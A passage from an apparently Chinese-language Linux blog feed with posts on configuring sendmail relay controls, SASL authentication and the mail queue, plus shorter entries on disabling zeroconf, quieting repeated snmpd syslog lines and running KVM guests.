（接收并安静地删除掉，让发送者感觉象被接收）<br>b.检查接收者。<br>用FEATURE(blacklist_recipients)允许指定access map中不应该接收email的用户。<br>如：<br>badlocaluser 550 Mailbox disabled for this username<br>host.mydomain 550 That host does not accept mail<br><a href="mailto:user@otherhost.mydomain" target="_blank" rel="noopener">user@otherhost.mydomain</a> 550 Mailbox disabled for this recipient<br>这将禁止发到你本地域中的用户邮件地址badlocaluse@mydomain和在主机<br>host.mydomain中的任何用户和单个地址 <a href="mailto:user@otherhost.mydomain" target="_blank" rel="noopener">user@otherhost.mydomain</a>.<br>注：关于access map的说明：<br>它的默认位置是/etc/mail/access. 每次更新后你必须运行<br>makemap hash /etc/mail/access.db &lt; /etc/mail/access ，不需要重启用Sendmail.<br>它可以有以下入口：<br>1.域名<br>2.email地址<br>3.本地用户名部分<br>4.IP地址（完整的或者子网）<br>和以下操作标记：<br>1.OK<br>接收email，即使被其它规则拒绝了<br>2.RELAY<br>允许通过该邮件主机relay的域。relay意味着OK<br>3.REJECT<br>拒绝email并显示内部通用的错误提示<br>4.DISCARD<br>安静地接收随后取消掉这封邮件<br>5.XYZ some other text<br>XYZ是 RFC 821兼容的错误代码后面跟上一段自定义的错误信息<br><strong>五.常见的两种检查规则   </strong>  </p><ol><li>check_relay 规则（发送者检查）：<br>检查主机名和IP地址，当无论什么时候，一台客户通过(E)SMTP连到邮件服务器时该规则被调用。     </li><li>check_rcpt 规则（接收者检查）：<br>用于RCPT命令(用来禁止未被授权的relay).该规则禁止了所有的已知的relay诡计。<br>你能#tail -f /var/log/maillog检查是否某个邮件被运用了上述规则。 <strong>**六. Why “550 Relaying Denied”?    </strong><br>如果你从你自己的邮件服务器得到了一个错误说”550 Relaying Denied”，你需要弄清楚为什么，甚至可能你认为这决不应该发生，但是你可能忽略了某些细节，看上去是应该被Relay，但实际上不。看下面的几个例子：<br>1.正确的DNS数据<br>QAA02454: … we do not relay<br>QAA02454: ruleset=check_rcpt, arg1=,<br>relay=170-51-209.ipt.aol.com [152.170.51.209], reject=550<br>… we do not relay<br>QAA02454: from=, size=0, class=0, pri=0, nrcpts=0,<br>proto=SMTP, relay=170-51-209.ipt.aol.com [152.170.51.209]<br>这里，主机名为170-51-209.ipt.aol.com的机器IP地址为152.170.51.209 试着交付一封邮件给，然而，这个被拒绝了，因为接收者不是本地接收者并且发送者的机器170-51-209.ipt.aol.com（152.170.51.209）也不是本地发送者。<br>2.错误的DNS数据<br>QAA02454: … Relaying denied<br>QAA02454: ruleset=check_rcpt, arg1=, relay=[134.245.85.93],<br>reject=550 … Relaying denied<br>QAA02454: from=, size=0, class=0, pri=0, nrcpts=0,<br>proto=SMTP, relay=[134.245.85.93]<br>这个其实与上面的情况相同，对于IP地址134.245.85.93没有PTR记录被找到，关于这一点有个问题就是：万一你的邮件主机的relay功能仅仅是基于主机/域名进行检查是否为本地发送者，(e.g., FEATURE(relay_entire_domain)，那样的话，如果该IP地址是属于你的本地域之内，仍将被你拒绝relay.解决办法是为这个IP地址加PTR记录，也就是反向DNS解析，或者添加到/etc/hosts文件中，再或者添加该IP地址到access map 中去（/etc/mail/access）。<br>3.不一致的DNS数据<br>QAA02454: … Relaying denied<br>QAA02454: ruleset=check_rcpt, arg1=,<br>relay=some.domain [10.0.0.1] (may be forged),<br>reject=550 … Relaying denied<br>QAA02454: from=, size=0, class=0, pri=0, nrcpts=0,<br>proto=SMTP, relay=some.domain [10.0.0.1] (may be forged)<br>这儿,(may be forged)是个很重要的部分：它说明对于该主机的DNS数据是不一致的，并且主机名不被用来检查是否被允许relay,而仅仅检查IP地址，因此这和第二种情况相同。<br><strong>七. 动态Relay授权控制简介：（DRAC）   </strong><br>DRAC是一个后台程序，它动态地为Sendmail更新access map文件，它提供一种方法，就是允许合法的用户通过你的SMTP邮件主机relay mail,同时仍然阻止其它人用它作为Spam Relay.当用户被POP/IMAP服务器认证后其IP地址被立即加入/etc/mail/access允许mail relay.默认地，该IP地址在access map的入口在30分钟后被终止了。<br>这种功能特别是对那些公司有用，它们在各个地方有办事处，外地办事处或出差在外的笔记本用户通过拨入当地ISP，且设置了发送邮件服务器为本公司的SMTP邮件主机时。<br>一般地，Sendmail所能看见的唯一可靠的信息是客户机的主机/域名或IP地址，并且当一个用户是通过拨本地ISP连接到其本公司总部的SMTP邮件服务器时，Sendmail不能分辩你的用户是spammer还是本公司合法员工，如果拨号用户有固定的IP地址/域名，你可以配置sendmail允许他们relay mail.但是大多数情况，特别在中国，拨号用户每次得到的是不同的变化多端的IP地址，因此你不得不告诉用户通过他们本地ISP提供的邮件主机发送邮件.<br>DRAC所用的方法是叫做POP-before-SMTP, 既然POP服务器知道每一个接收邮件的客户机的IP地址,这些IP地址能被收集起来动态构建access map,你可能需要写一个程序来收集这些地址,象上面说的一样,默认保留30分钟然后取消这些IP地址的mail relay. 一般地定期运行makemap程序更新access map.<br>这有两种情况:   </li><li>拨到ISP后先收后发.   </li><li>在发件信(outbox)中有信,拨号后先发后收.<br>第一种情况没有问题,对于第二种情况,需要在连到POP3信箱收信之后邮件才能被发送,<br>第一次发送将被拒绝.<br>第二种情况在被POP3取得认证后，随即access map被更新允许SMTP Mail Relay.**</li></ol>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>配置Sendmail</title>
      <link href="/2011/09/20/configure-sendmail/"/>
      <url>/2011/09/20/configure-sendmail/</url>
      <content type="html"><![CDATA[<h2 id="要生成sendmail-cf文件"><a href="#要生成sendmail-cf文件" class="headerlink" title="要生成sendmail.cf文件"></a>要生成sendmail.cf文件</h2><p>一般是编译sendmail.mc来生成sendmail.cf,这样的好处是通过编译，会查看出一些sendmail的设置错误和漏洞。</p><p># cd /etc/mail # vi sendmail.mc </p><p>(1)找到：</p><p>TRUST_AUTH_MECH(`EXTERNAL DIGEST-MD5 CRAM-MD5 LOGIN PLAIN’)dnl </p><p>打开注解，启用相应的认证机制，主要是为了支持Outlook。</p><p>(2)找到：   </p><p>DAEMON_OPTIONS(<code>Port=25, Name=MSA,M=Ea&#39;)dnl 这样sendmail将在25端口进行强制身份认证  dnl DAEMON_OPTIONS(</code>Port=smtp,Addr=0.0.0.0, Name=MTA’)dnl<br>dnl DAEMON_OPTIONS(`Port=587, Name=MSA,M=a’)dnl  </p><p>define(`confAUTH_MECHANISMS’, `EXTERNAL GSSAPI DIGEST-MD5 CRAM-MD5 LOGIN PLAIN’)dnl </p><p>打开注解，启用相应的认证机制，主要是为了支持Outlook。</p><p>(3)在(2)后添加两行：</p><p>设置MTA和MSA端口。</p><p>(4)找到：</p><p>dnl DAEMON_OPTIONS(`Port=smtp,Addr=127.0.0.1, Name=MTA’) </p><p>将该行注释掉，以允许通过网络连接Sendmail。</p><p>(5)找到：</p><p>dnl FEATURE(`accept_unresolvable_domains’) </p><p>禁止不可解析域名的转发邮件。</p><p>最后保存退出。</p><p>[<a href="http://kb.discuz.net/index.php?title=%E9%85%8D%E7%BD%AESendmail&amp;action=edit&amp;section=2" title="配置Sendmail" target="_blank" rel="noopener">编辑</a>]</p><h2 id="编译sendmail-mc生成sendmail-cf文件"><a href="#编译sendmail-mc生成sendmail-cf文件" class="headerlink" title="编译sendmail.mc生成sendmail.cf文件"></a>编译sendmail.mc生成sendmail.cf文件</h2><p># m4 /etc/mail/sendmail.mc &gt; /etc/mail/sendmail.cf # /etc/rc.d/init.d/sendmail restart –重起sendmail服务。 </p><p>如果在执行m4 /etc/mail/sendmail.mc &gt; /etc/mail/sendmail.cf 报错的话，那么检查是否安装sendmail-cf.*.rpm是否安装：</p><p># rpm -qa | grep sendmail-cf </p><p>如果没有安装，则需要在安装光盘中找到sendmail-cf包，并安装：</p><p># rpm -ivh sendmail-cf*.rpm </p><p>[<a href="http://kb.discuz.net/index.php?title=%E9%85%8D%E7%BD%AESendmail&amp;action=edit&amp;section=3" title="配置Sendmail" target="_blank" rel="noopener">编辑</a>]</p><h2 id="检测编译结果"><a href="#检测编译结果" class="headerlink" title="检测编译结果"></a>检测编译结果</h2><p>1、检测SASL被编译到sendmail中。</p><p>#/usr/sbin/sendmail -d0.1 -bv root |grep SASL </p><p>输出类似如下：</p><p>NETUNIX NEWDB NIS PIPELINING SASL SCANF STARTTLS TCPWRAPPERS </p><p>保证你看到SASL就是正确的。</p><p>2、检测25端口：</p><p># telnet localhost 25<br> Trying 127.0.0.1… Connected to localhost. Escape character is ‘^]’. 220 fyhtest.163.net ESMTP Sendmail 8.12.5/8.12.5; Thu, 10 Apr 2003 16:35:42 -0400 ehlo test 250-fyhtest.163.net Hello localhost [127.0.0.1], pleased to meet you 250-ENHANCEDSTATUSCODES 250-PIPELINING 250-8BITMIME 250-SIZE 250-DSN 250-ETRN 250-AUTH LOGIN PLAIN 250-DELIVERBY 250 HELP<br> quit —退出   </p><p>只要输出有LOGIN PLAIN就可以了。</p><p>到这里，sendmail就配置完了，你可以添加一个用户进行测试：</p><p>#useradd test #passwd test 设置密码 </p><p>把你服务器的域名添加到/etc/mail/local-host-names中。</p><p>[<a href="http://kb.discuz.net/index.php?title=%E9%85%8D%E7%BD%AESendmail&amp;action=edit&amp;section=4" title="配置Sendmail" target="_blank" rel="noopener">编辑</a>]</p><h2 id="其他设置"><a href="#其他设置" class="headerlink" title="其他设置"></a>其他设置</h2><p>要想更好的使用sendmail，常用到的一些设置：</p><p>1、限制最大邮件。</p><p># vi /etc/mail/sendmail.cf # maximum message size MaxMessageSize=5000000 (注：5M) </p><p>2、最大的群发数目。</p><p># vi /etc/mail/sendmail.cf # maximum number of recipients per SMTP envelope MaxRecipientsPerMessage=20 （注：20个） </p><p>3、域名文件—-local-host-name 可以用他来实现虚拟域名或多域名支持。</p><p># vi /etc/mail/local-host-name test.com test1.com </p><p>4、mail别名文件–aliases。</p><p># vi /etc/aliases 系统内部别名：discuz:bbsadmin discuz是我的用户名，其他的是别名，用逗号隔开。 转发到其他的邮箱：discuz:<a href="mailto:bbsadmin@discuz.com" target="_blank" rel="noopener">bbsadmin@discuz.com</a> # newaliases –写到库中 </p><p>5、邮件控制文件</p><p>relay、ok、reject和discard。</p><p>relay: 可以实现转发。</p><p>ok: 是用来允许用户的任意访问，它会覆盖任何其它已建立的检查（实际设置中，最好不要设为这项，除非你对该用户是绝对信任的）；</p><p>reject: 可以实现对来访地址的拒绝，它根本就不容许该地址与你的邮件服务器进行连接通信；</p><p>discard: 的作用是在接收到传输的邮件消息后，把它丢弃掉。在发送者看来，他的邮件的确是接收了，但他并不知道，发送的目的地址根本不可能接收到他的邮件，服务器巧妙地欺骗了他。</p><p># vi /etc/mail/<br>access<br> localhost.localdomain RELAY —允许 localhost RELAY 127.0.0.1 RELAY <a href="mailto:peng@sina.com" target="_blank" rel="noopener">peng@sina.com</a> ok @sexgirl.net reject 211.77.22.45 discard   </p><h1 id="makemap-hash-etc-mail-access-db-lt-etc-mail-access-–写到库中"><a href="#makemap-hash-etc-mail-access-db-lt-etc-mail-access-–写到库中" class="headerlink" title="makemap hash /etc/mail/access.db &lt; /etc/mail/access –写到库中"></a>makemap hash /etc/mail/access.db &lt; /etc/mail/access –写到库中</h1><p><strong>6、Sendmail环境下的防止邮件relay</strong><br>从8.9版本开始，缺省的是不允许邮件转发(mail relay)的。最简单的允许邮件转发的方法是在文件/etc/mail/relay-domains中进行设置。该文件中列出的域名内的信件都允许通过本地服务器进行邮件转发。<br>为了更精确的设置，可以在sendmail.mc中添加如下几个参数允许被用来设置邮件转发：<br>· FEATURE(relay_hosts_only). 通常情况下，在文件/etc/mail/relay-domains中列出的域名的主机都允许通过本地机转发，而该设置指示指定必须罗列出每个允许通过本机转发邮件的主机。<br>· FEATURE(relay_entire_domain). 该参数指示允许所有本地域通过本机进行邮件转发。<br>· FEATURE(access_db). 该参数指定利用哈希数据库/etc/mail/access来决定是否允许某个主机通过本地进行邮件转发。<br>· FEATURE(blacklist_recipients).若该参数被设置，则在决定是否允许某个主机转发邮件时同时察看邮件发送着地址和邮件接受者地址。<br>· FEATURE(rbl).允许基于maps.vix.com由黑名单(Realtime Blackhole List)进行邮件拒绝，以防范垃圾邮件。<br>· FEATURE(accept_unqualified_senders).允许接受发送者地址不包括域名的邮件，例如user，而不是<a href="mailto:user@B.NET" target="_blank" rel="noopener">user@B.NET</a>。<br>· FEATURE(accept_unresolvable_domains).通常来讲，sendmail拒绝接受发送者邮件地址指定的主机通过DNS不能解析的邮件，而该参数允许接收这种邮件。<br>· FEATURE(relay_based_on_MX).该参数允许转发邮件接受者地址的MX记录指向本地的的邮件，例如，本地接收到一个发送目的地址为<a href="mailto:user@b.com" target="_blank" rel="noopener">user@b.com</a>的邮件，而b.com域名的MX记录指向了本地机器，则本地机器就允许转发该邮件。<br>下面几个特性可能会有安全漏洞，一般当邮件服务器位于防火墙后时才应该使用，因为这些参数可能导致你的系统易于被垃圾邮件发送者利用。    </p><p>·FEATURE(relay_local_from).该参数指定若消息自称源于本地域，则允许转发该邮件。<br>             ·FEATURE(promiscuous_relay).打开对所有的邮件的转发。</p><p>7.设置完成后outlook发送邮件要求验证时，出现错误  </p><p>Jan 30 14:45:57 qiuding sendmail[13908]: o0U6jvs1013908: [116.230.242.136] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA<br>Jan 30 14:45:58 qiuding sendmail[13909]: o0U6jw4h013909: [116.230.242.136] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA<br>Jan 30 14:47:38 qiuding sendmail[13918]: o0U6lcCc013918: [116.230.242.136] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA<br>Jan 30 14:47:41 qiuding sendmail[13919]: o0U6lefW013919: [116.230.242.136] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA<br>Jan 30 14:47:42 qiuding sendmail[13920]: o0U6lfoF013920: [116.230.242.136] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA<br>Jan 30 14:47:43 qiuding sendmail[13921]: o0U6lgtZ013921: [116.230.242.136] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA<br>Jan 30 14:47:43 qiuding sendmail[13922]: o0U6lh53013922: [116.230.242.136] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA<br>Jan 30 14:47:44 qiuding sendmail[13923]: o0U6li7I013923: [116.230.242.136] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA<br>大量查找资料原来是<br>认证进程没有启动  SASLAUTHD服务一定要启动否则无法进行用户验证<br>etc/rc.d/init.d/saslauthd start<br><a href="http://www.blogjava.net/Files/lyjjq/sendmail_dovecot.rar" target="_blank" rel="noopener">配置下载</a>  </p><p>sendmail -bd -q1h  </p><p>　　Sendmail的命令参数的含义如下：  </p><p>　　-b：指定Sendmail在后台运行，并且监听端口25的请求。  </p><p>　　-d：指定Sendmail以Daemon方式运行(守护进程)。  </p><p>　　-q：当Sendmail无法将邮件成功地发送到目的地时，它会将邮件保存在队列里。该参数指定邮件在队列里保存的时间。例子里的1h表示保留1小时。  </p><p>　　在终端命令窗口运行以下命令来重新启动Sendmail服务：  </p><p>　　[root@ahpeng root]#/etc/rc.d/init.d/sendmail restart  </p><p>　　在终端命令窗口运行以下命令来关闭Sendmail服务：  </p><p>　　[root@ahpeng root]#/etc/rc.d/init.d/sendmail stop  </p><p>　　我们还可以在终端命令窗口运行以下命令来检测Sendmail服务器的运行状态：  </p><p>　　[root@ahpeng root]# /etc/rc.d/init.d/sendmail status  </p><p>　　系统应该显示：  </p><p>　　sendmail (pid 3251) 正在运行…  </p><p>/etc/mail目录下操作<br>makemap hash access.db&lt;access<br>killall -9 sendmail<br>etc/rc.d/init.d/saslauthd start<br>sendmail -bd -q30m</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 配置sendmail </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>管理 sendmail 的邮件队列</title>
      <link href="/2011/09/20/manage-mail-queues-for-sendmail/"/>
      <url>/2011/09/20/manage-mail-queues-for-sendmail/</url>
      <content type="html"><![CDATA[<p>邮件队列是存储 sendmail 命令传送的邮件消息数据和控制文件的目录。缺省情况下，邮件队列是 /var/spool/mqueue。</p><p>邮件消息可能由于很多原因而排入队列。</p><p>例如：</p><ol><li>sendmail 命令可以配置成按一定的时间间隔处理队列，而不是立即处理。如果这样，邮件消息必须临时存储。</li><li>如果一个远程主机不响应一个邮件连接的请求，邮件系统会将这些消息排入队列，稍后再作尝试。</li></ol><h3 id="打印邮件队列"><a href="#打印邮件队列" class="headerlink" title="打印邮件队列"></a>打印邮件队列</h3><p>队列内容可以使用 mailq 命令打印（或通过指定 sendmail 命令的 -bp 标志）。</p><p>这些命令产生队列标识、消息大小、消息进入队列的日期以及发送方与收件人的列表。</p><h3 id="邮件队列文件"><a href="#邮件队列文件" class="headerlink" title="邮件队列文件"></a>邮件队列文件</h3><p>队列中的每条消息都与一定数量的文件相关联。这些文件按以下约定命名：</p><p>TypefID</p><p>其中 ID 是一个唯一的消息队列标识，而 Type 是以下表示文件类型的字母中的一个：</p><p>d</p><p>包含消息正文但无标题信息的数据文件。</p><p>q</p><p>队列控制文件。该文件包含处理作业所需要的信息。</p><p>t</p><p>临时文件。该文件是 q 文件重建时的一个映象。它快速重命名为 q 文件。</p><p>x</p><p>在会话过程中存在并显示该次会话中发生的任何事件的记录文件。</p><p>例如，如果一条消息的队列标识为 AA00269，当 sendmail 命令尝试传送消息时，在邮件队列目录中创建和删除以下文件：</p><p>dfAA00269</p><p>数据文件</p><p>qfAA00269</p><p>控制文件</p><p>tfAA00269</p><p>临时文件</p><p>xfAA00269</p><p>记录文件</p><h4 id="q-控制文件"><a href="#q-控制文件" class="headerlink" title="q 控制文件"></a>q 控制文件</h4><p>q 控制文件包括一系列行，每一行都以一个代码字母开始：</p><p>B</p><p>指定 body type。该行其余部分是定义 body type 的文本字符串。如果缺失该项字段，则缺省情况下 body type 是 7 位的，而且不会尝试特殊的处理。合法值是 7BIT 和 8BITMIME。</p><p>C</p><p>包括控制用户。对于以文件或程序作收件人的地址，sendmail 作为该文件或程序的所有者来执行传送。控制用户被设置为文件或程序的所有者。由 .forward 或 :include: 文件读取的收件人地址也将使控制用户被设置为文件所有者。当 sendmail 传送邮件到这些收件人时，sendmail 作为控制用户传送，然后转换回 root 用户。</p><p>F</p><p>包括信包标志。标志是以下的任意组合：w（设置 EF_WARNING 标志）、r（设置 EF_RESPONSE 标志）、8（设置 EF_HAS8BIT 标志）和 b（设置 EF_DELETE_BCC 标志）。其它字母则被忽略而无提示。</p><p>H</p><p>包括一个标题定义。此类行的数量任意。H 行出现的顺序确定了它们在最终消息里的出现顺序。这些行使用的语法与 /etc/mail/sendmail.cf 配置文件中的标题定义相同。（对于早于 AIX 5.1 的版本，该文件是 /etc/sendmail.cf。）</p><p>I</p><p>为 df 文件指定内节点和设备信息；这可以在磁盘崩溃后用来恢复邮件队列。</p><p>K</p><p>指定上一次传输尝试的时间（以秒为单位）。</p><p>&lt; span&gt;M</p><p>当一条消息由于在传送尝试中出现了错误而放入队列时，错误的性质就存储在 M 行。</p><p>N</p><p>指定传送尝试的总数。</p><p>O</p><p>指定 ESMTP 的消息传输系统（MTS）的原始值。它只用于传送状态通知。</p><p>P</p><p>包括当前消息的优先级。优先级用来对队列排序。数字越大表示优先级越低。当消息位于队列中时优先级增加。初始优先级取决于消息的类和消息的大小。</p><p>Q</p><p>包含初始收件人，由 ESMTP 事务中的 ORCPT= 字段指定。仅用于传送状态通知。只应用于紧接着的 R 行。</p><p>R</p><p>包含收件人地址。每个收件人占一行。</p><p>S</p><p>包含发送方地址。此类行只有一行。</p><p>T</p><p>包含消息创建时间，用来计算何时消息超时。</p><p>V</p><p>指定队列文件格式版本号（该队列文件格式用来允许新的 sendmail 二进制文件读取旧版本创建的队列文件）。缺省时指版本 0。如果存在，必须是文件的第一行。</p><p>Z</p><p>指定原始信包标识（从 ESMTP 事务中）。只用于传送状态通知。</p><p>$</p><p>包含宏定义。某些宏（$r 和 $s）的值会传递到队列运行阶段。</p><p>传送到 amy@zeus 的消息的 q 文件类似于：</p><p>P217031 T566755281 MDeferred: Connection timed out during user open with zeus Ramy@zeus H?P?return-path: <geo> Hreceived: by george (0.13 (NL support)/0.01) id AA00269; Thu, 17 Dec 87 10:01:21 CST H?D?date: Thu, 17 Dec 87 10:01:21 CST H?F?From: geo Hmessage-id: &lt;8712171601.AA00269@george&gt; HTo: amy@zeus Hsubject: test</geo></p><p>其中：</p><p>P217031</p><p>消息的优先级</p><p>T566755281</p><p>提交时间（秒）</p><p>MDeferred: Connection timed out during user open with zeus</p><p>状态消息</p><p>Sgeo</p><p>发送方标识</p><p>Ramy@zeus</p><p>收件人标识</p><p>Hlines</p><p>消息的报头信息</p><h3 id="在-sendmail-中指定时间值"><a href="#在-sendmail-中指定时间值" class="headerlink" title="在 sendmail 中指定时间值"></a>在 sendmail 中指定时间值</h3><p>要设置消息超时和队列处理间隔，必须用特定的时间值格式。时间值的格式是：</p><p>-qNumberUnit</p><p>其中 Number 是一个整数值，Unit 是单位字母。Unit 可以是以下值中的一个：</p><p>s</p><p>秒</p><p>m</p><p>分</p><p>h</p><p>小时</p><p>d</p><p>天</p><p>w</p><p>周</p><p>如果没有指定 Unit，sendmail 守护程序使用分（m）作为缺省值。下面三个示例说明时间值的规范：</p><p>/usr/sbin/sendmail -q15d</p><p>该命令使得 sendmail 守护程序每 15 天处理一次队列。</p><p>/usr/sbin/sendmail -q15h</p><p>该命令使得 sendmail 守护程序每 15 小时处理一次队列。</p><p>/usr/sbin/sendmail -q15</p><p>该命令使得 sendmail 守护程序每 15 分钟处理一次队列。</p><h3 id="强制邮件队列"><a href="#强制邮件队列" class="headerlink" title="强制邮件队列"></a>强制邮件队列</h3><p>在某些情况下，您可能发现队列由于某种原因阻塞。您可以使用 -q 标志（没有值）强制一个队列运行。您也可以用 -v 标志（详细）来观察发生了什么：</p><p>/usr/sbin/sendmail -q -v</p><p>使用一个队列修饰符，您也可以将作业限制在具有特定队列标识符、发送方或收件人的范围中。例如，-qRsally 将队列运行限制为收件人地址之一中有字符串 sally 的作业。同样，-qS 字符串会将运行限制为特定的发送方，而 -qI 字符串将它限制为特定的队列标识。</p><h3 id="设置队列处理时间间隔"><a href="#设置队列处理时间间隔" class="headerlink" title="设置队列处理时间间隔"></a>设置队列处理时间间隔</h3><p>守护程序启动时 -q 标志的值确定 sendmail 守护程序处理邮件队列的时间间隔。</p><p>sendmail 守护程序通常由 /etc/rc.tcpip 文件在系统启动时启动。/etc/rc.tcpip 文件包含一个称为队列处理间隔（QPI）的变量，该变量在该文件启动 sendmail 守护程序时用来指定 -q 标志的值。缺省情况下，qpi 的值是 30 分钟。要指定不同的队列处理间隔：</p><ol><li>用您喜欢的编辑器编辑 /etc/rc.tcpip 文件。</li><li><p>查找给 qpi 变量指定值的行，例如：</p><p>qpi=30m</p></li><li><p>将指定给变量 qpi 的值更改为希望的时间值。</p></li></ol><p>这些变化会在下一次系统重新启动时生效。如果您想让这些变化立刻生效，请停止并重新启动 sendmail 守护程序，指定新的 -q 标志值。更多相关信息，请参阅<a href="http://publib16.boulder.ibm.com/pseries/zh_CN/aixbman/commadmn/ml_queue.htm#a2a5b399043joyc" target="_blank" rel="noopener">停止 sendmail 守护程序</a>和<a href="http://publib16.boulder.ibm.com/pseries/zh_CN/aixbman/commadmn/ml_queue.htm#c15fd1b790atla" target="_blank" rel="noopener">启动 sendmail 守护程序</a>。</p><h3 id="移动邮件队列"><a href="#移动邮件队列" class="headerlink" title="移动邮件队列"></a>移动邮件队列</h3><p>当一个主机长期关闭时，路由到（或通过）该主机的很多消息可能存储在邮件队列中。结果 sendmail 命令要花费很长时间对队列排序，这严重降低了系统性能。如果您移动队列到一个临时空间并创建一个新的队列，旧队列可以稍后在该主机恢复服务后运行。要移动队列到一个临时空间并创建一个新的队列，请：</p><ol><li>按<a href="http://publib16.boulder.ibm.com/pseries/zh_CN/aixbman/commadmn/ml_queue.htm#a2a5b399043joyc" target="_blank" rel="noopener">停止 sendmail 守护程序</a>中的指示信息停止 sendmail 守护程序。</li><li><p>输入以下内容移动整个队列目录：</p><p>cd /var/spool     mv mqueue omqueue</p></li><li><p>按<a href="http://publib16.boulder.ibm.com/pseries/zh_CN/aixbman/commadmn/ml_queue.htm#c15fd1b790atla" target="_blank" rel="noopener">启动 sendmail 守护程序</a>中的指示信息重新启动 sendmail 守护程序。</p></li><li><p>输入以下内容处理旧邮件队列：</p><p>/usr/sbin/sendmail -oQ/var/spool/omqueue -q</p><p>-oQ 标志指定一个备用队列目录。 -q 标志指定运行队列中的每一项作业。要获取操作过程的报告，请使用 -v 标志。</p><p>注:</p><p>此操作可能要花些时间。</p></li><li><p>当队列为空时，输入以下内容除去日志文件和临时目录：</p><p>rm /var/spool/omqueue/*     rmdir /var/spool/omqueue</p></li></ol><h3 id="启动-sendmail-守护程序"><a href="#启动-sendmail-守护程序" class="headerlink" title="启动 sendmail 守护程序"></a>启动 sendmail 守护程序</h3><p>要启动 sendmail 守护程序，请输入以下命令中的一个：</p><p>startsrc -s sendmail -a “-bd -q15”</p><p>/usr/lib/sendmail -bd -q15</p><p>如果 sendmail 守护程序在输入这些命令中的一个时已经激活，请参阅屏幕上的以下消息：</p><p>sendmail 子系统已经激活。不支持多实例。</p><p>如果 sendmail 守护程序没有被激活，您将会看到一条消息表示 0sendmail 守护程序已经启动。</p><h3 id="停止-sendmail-守护程序"><a href="#停止-sendmail-守护程序" class="headerlink" title="停止 sendmail 守护程序"></a>停止 sendmail 守护程序</h3><p>要停止 sendmail 守护程序，请运行 stopsrc -s sendmail 命令。</p><p>如果 sendmail 守护程序没有随 startsrc 命令启动，请：</p><ul><li>查找 sendmail 进程标识。</li><li>输入 kill sendmail_pid 命令。（其中 sendmail_pid 是 sendmail 过程的处理标识）。</li></ul>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>zeroconf</title>
      <link href="/2011/09/19/zeroconf/"/>
      <url>/2011/09/19/zeroconf/</url>
      <content type="html"><![CDATA[<p>avahi-daemon, avahi-dnsconfd<br>Avahi 是 zeroconf 协议的实现。它可以在没有 DNS 服务的局域网里发现基于 zeroconf 协议的设备和服务。它跟 mDNS 一样。除非你有兼容的设备或使用 zeroconf 协议的服务，否则应该关闭它。我把它关闭。<br>可以在配置文件里关闭它<strong>NOZEROCONF</strong>=yes</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zeroconf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux问题：last message repeated N times</title>
      <link href="/2011/09/08/linux-problem-last-message-to-the-n-times/"/>
      <url>/2011/09/08/linux-problem-last-message-to-the-n-times/</url>
      <content type="html"><![CDATA[<p>偶然发现系统日志/var/log/messages里出现大量错误信息：  </p><p>Jun 8 13:20:49 SERVER snmpd[14281]: Connection from UDP: [192.168.0.178]:9632<br>Jun 8 13:25:07 SERVER last message repeated 7 times<br>Jun 8 13:30:49 SERVER last message repeated 8 times  </p><p>先来想办法重现一下这个问题，在shell里使用logger命令：  </p><p>logger “foo”<br>logger “foo”<br>logger “foo”<br>logger “bar”  </p><p>logger命令会向/var/log/messages日志里写入相应的信息，可以用tail -f /var/log/messages查看：  </p><p>Jun 8 21:23:32 SERVER root: foo<br>Jun 8 21:23:34 SERVER last message repeated 2 times<br>Jun 8 21:23:37 SERVER root: bar  </p><p>大致了解了last message repeated N times信息产生的原因。至于它的作用，无非是为了屏蔽不必要的重复信息，感觉用处不大，看着还闹心。真实的重复信息也就是last message repeated N times上面的信息，如此一来，回到文章开头，就能猜到本文中出现大量last message repeated N times的原因在于有一个IP不断的连接snmpd服务，且中间没有插入其他日志信息。  </p><p>查看一下snmpd的启动脚本/etc/init.d/snmpd，会发现里面有如下参数设置：  </p><p>OPTIONS=”-Lsd -Lf /dev/null -p /var/run/snmpd.pid -a”  </p><p>通过man snmpd和man snmpcmd查到-Lsd参数的作用就是向syslog里系日志，没什么大用，直接去掉：  </p><p>OPTIONS=”-Lf /dev/null -p /var/run/snmpd.pid -a”  </p><p>修改后别忘了重启一下服务：/etc/init.d/snmpd restart，唐僧不再唠叨，世界终于清净了。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> last </tag>
            
            <tag> message </tag>
            
            <tag> repeate </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kvm使用virtio硬盘</title>
      <link href="/2011/09/07/the-kvm-uses-the-virtio-hard-disk/"/>
      <url>/2011/09/07/the-kvm-uses-the-virtio-hard-disk/</url>
      <content type="html"><![CDATA[<p>在Ubuntu下面需要安装下面的软件：</p><p>sudo apt-get install kvm qemu-kvm</p><p>加入个人用户到kvm组，以保证个人用户可以读写/dev/kvm，否则，以个人用户无法运行kvm：</p><p>sudo adduser $USER kvm</p><p>如果想使用物理磁盘，则需要加个人用户到disk组：</p><p>sudo adduser $USER disk</p><p>现在最好重启一下计算机！</p><p>下面开始安装操作系统，我安装了Windows XP和Windows 7，下面以Windows XP为例开始安装。</p><p>先准备好一个磁盘文件，有2种常用的格式，一个是qemu的qcow2格式，一个是raw格式，前者是可以增长的文件格式，后者实际是磁盘上一个连续区域。</p><p>qcow2:</p><p>qemu-img create -f qcow2 winxp.img 10G</p><p>Raw：</p><p>dd if=/dev/zero of=winxp.img bs=1024K count=10000</p><p>下面开始安装，准备好安装光盘文件winxp.iso，下面是安装的指令：</p><p>kvm -m 1024 -cdrom=winxp.iso -hda winxp.img -boot d -localtime</p><p>XP安装很快，20分钟左右就可以安装好，Win 